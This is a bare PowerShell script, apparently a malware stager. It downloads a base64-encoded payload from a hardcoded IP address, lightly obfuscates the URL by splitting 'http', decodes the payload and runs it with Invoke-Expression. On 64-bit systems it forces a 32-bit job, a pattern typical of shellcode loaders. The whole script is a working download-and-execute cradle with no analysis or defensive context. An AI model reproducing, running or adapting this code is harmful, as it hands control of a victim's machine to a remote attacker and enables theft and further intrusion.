Set-StrictMode -Version 2


$xzqsec= ((New-Object System.Net.Webclient).DownloadString('ht'+'tp://101.43.242.147/twsec.txt'))



$twsec=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($xzqsec))

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $twsec | wait-job | Receive-Job
}
else {
	IEX $twsec
}
